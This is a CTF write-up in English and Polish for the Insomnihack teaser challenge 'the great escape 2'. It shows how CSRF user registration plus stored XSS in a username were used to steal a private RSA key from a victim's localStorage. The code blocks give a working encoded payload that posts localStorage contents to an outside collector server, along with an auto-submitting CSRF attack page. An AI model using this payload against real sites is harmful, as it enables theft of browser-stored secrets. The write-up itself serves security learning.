# the great escape 2 (web 200)

###ENG
[PL](#pl-version)

We start this task in the place where we finished part 1.
We have web address for `ssc.teaser.insomnihack.ch` and we have an email `rogue@ssc.teaser.insomnihack.ch` where we can send links to be visited by our victim.
What we want to extract now is the private RSA key stored in the target local storage.

For this purpose we need some XSS, so we can extract the key via javascript.

First XSS we found where browsing through user files via REST API at `https://ssc.teaser.insomnihack.ch/api/files.php?action=list` but this proved to be useless since the target was logged-out and also we could not upload any files for him because the credentials were changed, compared to what was available in pcap.

But we figured that maybe there is a similar vulnerability in a different REST endpoint, and in fact there was one, in the current user endpoint at `https://ssc.teaser.insomnihack.ch/api/user.php?action=getUser`.

The vuln in both cases was that this page was rendered as HTML and not as JSON, and therefore username with HTML tags would get them rendered on this page.
On top of that registering new user with POST request would actually redirect to this page automatically!

So we had to get the target to enter our webpage, where we can perform CSRF request registering new user on `ssc` website, and place javascript stealing the local storage contents in the username.

There are some limitations to what we can pass as parameters here so we had to encode the payload via:

```python
real = '''
<script>
var data = ''
for (var key in localStorage){
	data += localStorage.getItem(key)
}
var http = new XMLHttpRequest();
http.open("POST", "https://xss.p4.team/index.php", true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.send("data=" + data);
</script>
'''
payload = "<img src=/ onerror=javascript:document.write(String.fromCharCode({}));>".format(','.join([str(ord(c)) for c in real]))
```

And the whole resulting attack page was:

```html
<html>
    <form id="1234" action="https://ssc.teaser.insomnihack.ch/api/user.php" method="post">
    <input name="action" value="login" ></input>
<input name="name" value="<img src=/ onerror=javascript:document.write(String.fromCharCode(10,32,32,32,32,60,115,99,114,105,112,116,62,10,32,32,32,32,118,97,114,32,100,97,116,97,32,61,32,39,39,10,32,32,32,32,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,108,111,99,97,108,83,116,111,114,97,103,101,41,123,10,32,32,32,32,32,32,32,32,100,97,116,97,32,43,61,32,108,111,99,97,108,83,116,111,114,97,103,101,46,103,101,116,73,116,101,109,40,107,101,121,41,10,32,32,32,32,125,10,32,32,32,32,118,97,114,32,104,116,116,112,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,32,32,32,32,104,116,116,112,46,111,112,101,110,40,34,80,79,83,84,34,44,32,34,104,116,116,112,115,58,47,47,120,115,115,46,112,52,46,116,101,97,109,47,105,110,100,101,120,46,112,104,112,34,44,32,116,114,117,101,41,59,10,32,32,32,32,104,116,116,112,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,116,121,112,101,34,44,32,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,59,10,32,32,32,32,104,116,116,112,46,115,101,110,100,40,34,100,97,116,97,61,34,32,43,32,100,97,116,97,41,59,10,32,32,32,32,60,47,115,99,114,105,112,116,62,10,32,32,32,32));>">
        <input name="password" value="aa">
    </form>
</html>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js"></script>
<script type="text/javascript">
  $(document).ready(function() {
    window.document.forms[0].submit();
  });
</script>
```

Once the target got on this webpage he would register a user with our javascript payload, get redirected to result page with script executed and the local storage contents would get sent to our server.
This way we extracted the RSA private key to decode binary for stage 3 and the flag `INS{IhideMyVulnsWithCrypto}`

###PL version

Zaczynamy tam gdzie zakończylismy analizę części 1.
Mamy adres strony `ssc.teaser.insomnihack.ch` oraz mail `rogue@ssc.teaser.insomnihack.ch` gdzie możemy wysyłać linki do odwiedzenia przez naszą ofiarę.
Chcemy teraz wyciągnąć prywatny klucz RSA z local storage przeglądarki ofiary.

Do tego potrzeba nam podatności XSS, żeby wyciągnąć dane za pomocą javascriptu.

Pierwszy XSS jaki znaleźliśmy znajdował się w listingu plików za pomocą REST API pod `https://ssc.teaser.insomnihack.ch/api/files.php?action=list` ale to okazało się bezużyteczne, bo ofiara była wylogowana oraz nie mogliśmy dodać żadnych plików dla ofiary bo login i hasło uległy zmianie w porównaniu do tych z pcapa.

Ale uznaliśmy, że może jest drugi podobny błąd w innym endpoincie REST i faktycznie był kolejny podczas wyświetlania aktualnie zalogowanego użytkownika pod `https://ssc.teaser.insomnihack.ch/api/user.php?action=getUser`.

Podatność polegała w obu sytuacjach na tym, że strona wynikowa była renderowana jako HTML a nie jako JSON, więc jeśli login zawierałby jakieś tagi HTML to te zostałyby wyrenderowane na stronie.
Ponaddto rejestracja nowego użytkownika żądaniem POST automatycznie przenosiła nas na tą stronę z wynikiem logowania.

Musieliśmy teraz podstawić ofierze naszą stronę, na której za pomocą żądania CSRF zarejestrowalibyśmy nowego użytkownika w serwisie `ssc` a w jego loginie umieścilibyśmy javascript kradnący zawartość local storage.

Były pewne ograniczenia na to co można było przekazać jako parametry więc payload był kodowany przez:

```python
real = '''
<script>
var data = ''
for (var key in localStorage){
	data += localStorage.getItem(key)
}
var http = new XMLHttpRequest();
http.open("POST", "https://xss.p4.team/index.php", true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.send("data=" + data);
</script>
'''
payload = "<img src=/ onerror=javascript:document.write(String.fromCharCode({}));>".format(','.join([str(ord(c)) for c in real]))
```

A cała utworzona strona ataku:

```html
<html>
    <form id="1234" action="https://ssc.teaser.insomnihack.ch/api/user.php" method="post">
    <input name="action" value="login" ></input>
<input name="name" value="<img src=/ onerror=javascript:document.write(String.fromCharCode(10,32,32,32,32,60,115,99,114,105,112,116,62,10,32,32,32,32,118,97,114,32,100,97,116,97,32,61,32,39,39,10,32,32,32,32,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,108,111,99,97,108,83,116,111,114,97,103,101,41,123,10,32,32,32,32,32,32,32,32,100,97,116,97,32,43,61,32,108,111,99,97,108,83,116,111,114,97,103,101,46,103,101,116,73,116,101,109,40,107,101,121,41,10,32,32,32,32,125,10,32,32,32,32,118,97,114,32,104,116,116,112,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,32,32,32,32,104,116,116,112,46,111,112,101,110,40,34,80,79,83,84,34,44,32,34,104,116,116,112,115,58,47,47,120,115,115,46,112,52,46,116,101,97,109,47,105,110,100,101,120,46,112,104,112,34,44,32,116,114,117,101,41,59,10,32,32,32,32,104,116,116,112,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,116,121,112,101,34,44,32,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,59,10,32,32,32,32,104,116,116,112,46,115,101,110,100,40,34,100,97,116,97,61,34,32,43,32,100,97,116,97,41,59,10,32,32,32,32,60,47,115,99,114,105,112,116,62,10,32,32,32,32));>">
        <input name="password" value="aa">
    </form>
</html>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js"></script>
<script type="text/javascript">
  $(document).ready(function() {
    window.document.forms[0].submit();
  });
</script>
```

Kiedy cel wszedł na stronę, zarejestrował użytkownika z javascriptem w loginie, został przekierowany na stronę wyników, skrypt się wykonał i na nasz serwer wysłana została zawartość local storage.
W ten sposób uzyskaliśmy klucz prywatny RSA do odszyfrowania binarki dla poziomu 3 oraz flagę `INS{IhideMyVulnsWithCrypto}`
